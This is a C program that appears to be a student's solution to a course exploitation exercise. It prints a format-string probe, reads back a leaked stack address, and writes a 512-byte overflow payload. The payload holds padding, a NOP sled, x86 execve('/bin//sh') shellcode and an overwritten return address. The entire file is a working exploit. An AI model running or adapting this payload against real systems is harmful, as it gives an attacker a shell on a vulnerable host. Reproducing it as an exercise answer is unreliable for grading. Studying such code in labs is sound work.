
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Note the bigger buffer this time
#define BUFFER_SIZE 512

// We are providing you with shell code
char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax         */
    "\x50"                 /* pushl   %eax              */
    "\x68""//sh"           /* pushl   $0x68732f2f       */
    "\x68""/bin"           /* pushl   $0x6e69622f       */
    "\x89\xe3"             /* movl    %esp,%ebx         */
    "\x50"                 /* pushl   %eax              */
    "\x53"                 /* pushl   %ebx              */
    "\x89\xe1"             /* movl    %esp,%ecx         */
    "\x99"                 /* cdql                      */
    "\xb0\x0b"             /* movb    $0x0b,%al         */
    "\xcd\x80"             /* int     $0x80             */
    ;

int main()
{
    char buffer[BUFFER_SIZE];
    memset(buffer, 0, BUFFER_SIZE);  // Initialized to all zeroes

    fprintf(stderr, "send debug statements to stderr\n");

    char greeting[128] = "%x %x %x\n";

    write(STDOUT_FILENO, greeting, sizeof(greeting) - 1);

    char response[512];
    fgets(response, sizeof(response), stdin);

    fprintf(stderr, "%s\n", response);
    char s[1] = " ";
    char *tok;
    int addr = 0;
    tok = strtok(response, s);
    while (tok != NULL)
    {
      addr = strtol(tok, NULL, 16);
      tok = strtok(NULL, s);
    }

    addr = addr;
    strcpy(buffer, "AAAAAAAAAAAAAAAA");
    memset(buffer + 16, 0x90, BUFFER_SIZE - 16);
    memcpy(buffer + 512 - (sizeof(shellcode) + 1), shellcode, 25);
    memcpy(buffer + 28, &addr, 4);
    memset(buffer + 507, 0, 1);
    fprintf(stderr, "%s\n", buffer);
    write(STDOUT_FILENO, buffer, BUFFER_SIZE);

    return EXIT_SUCCESS;
}
